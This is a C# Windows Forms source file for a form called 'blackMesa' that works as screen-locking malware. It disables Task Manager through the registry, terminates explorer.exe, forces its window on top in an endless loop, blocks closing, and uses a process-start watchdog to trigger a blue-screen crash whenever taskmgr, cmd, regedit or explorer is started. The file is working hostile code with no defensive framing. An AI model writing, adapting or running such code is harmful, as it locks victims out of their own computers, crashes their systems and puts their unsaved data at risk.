using Microsoft.Win32;
using Project.Classes;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Media;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Project.Forms
{
    public partial class blackMesa : Form
    {
        public blackMesa()
        {
            InitializeComponent();
            initiateWatchdog();
        }

        private string[] blockedProcesses = { "taskmgr.exe", "cmd.exe", "regedit.exe", "explorer.exe"};
        
        private void initiateWatchdog()
        {
            ManagementEventWatcher startWatch = new ManagementEventWatcher(new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
            startWatch.EventArrived += StartWatch_EventArrived;
            startWatch.Start();
        }
        private void forceTopMost()
        {
            new Thread(() => { while (true) { Shenanigans.SetWindowTopMost(this); } }).Start();
        }

        private void StartWatch_EventArrived(object sender, EventArrivedEventArgs e)
        {
            string processName = (string)e.NewEvent.Properties["ProcessName"].Value;
            if (blockedProcesses.Contains(processName.ToLower()))
            {
                Shenanigans.TriggerBSOD();
            }
        }

        SoundPlayer player = new SoundPlayer(Properties.Resources.music);

        private void blackMesa_Load(object sender, EventArgs e)
        {
            this.Focus();
            forceTopMost();
            richTextBox1.SelectAll();
            richTextBox1.SelectedRtf = Properties.Resources.mesa;
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", "1");
            rk.Close();
            player.PlayLooping();

            foreach (var process in Process.GetProcessesByName("explorer"))
            {
                Unmanaged.TerminateProcess(process.Handle, 1);
            }
        }

        private void blackMesa_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            SystemSounds.Asterisk.Play();
        }
    }
}
